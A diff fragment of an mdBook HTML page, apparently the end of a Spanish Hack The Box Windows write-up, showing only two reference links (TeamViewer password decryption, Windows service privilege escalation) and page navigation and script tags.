+<li><a href="https://whynotsecurity.com/blog/teamviewer/">Descrifrado de contraseñas TeamViewer post de blog</a>.</li>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services">HackTricks - Local Privilege Escalation - Services</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../../../htb/boxes/windows/1_facil/Devel/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../../../../htb/boxes/windows/1_facil/Access/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../../../htb/boxes/windows/1_facil/Devel/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../../../../htb/boxes/windows/1_facil/Access/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../../../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../../../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
